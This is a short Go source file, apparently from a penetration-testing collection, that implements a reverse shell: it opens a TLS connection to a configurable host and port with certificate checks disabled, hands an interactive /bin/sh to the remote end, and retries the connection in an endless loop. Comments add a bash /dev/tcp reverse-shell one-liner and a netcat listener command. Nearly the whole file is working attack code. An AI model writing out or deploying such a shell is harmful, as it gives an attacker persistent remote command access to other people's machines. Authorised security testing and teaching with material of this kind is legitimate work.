// Reverse Shell in Go
// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
// Test with nc -lvvp 12345
package main

import (
	"crypto/tls"
	"os/exec"
	"time"
	"log"
)

func main() {
	reverse("127.0.0.1:12345")
}

// bash -i >& /dev/tcp/localhost/12345 0>&1
func reverse(host string) {
	// читаем ключ и сертификат
	cert, err := tls.LoadX509KeyPair("client.pem", "client.key")

	if err != nil {
		log.Fatal(err)
	}

	hostName := "localhost" // change this
	portNum := "12345"

	// создаем конфиг tls
	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	c, err := tls.Dial("tcp", hostName+":"+portNum, &config)
	
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse(host)
}
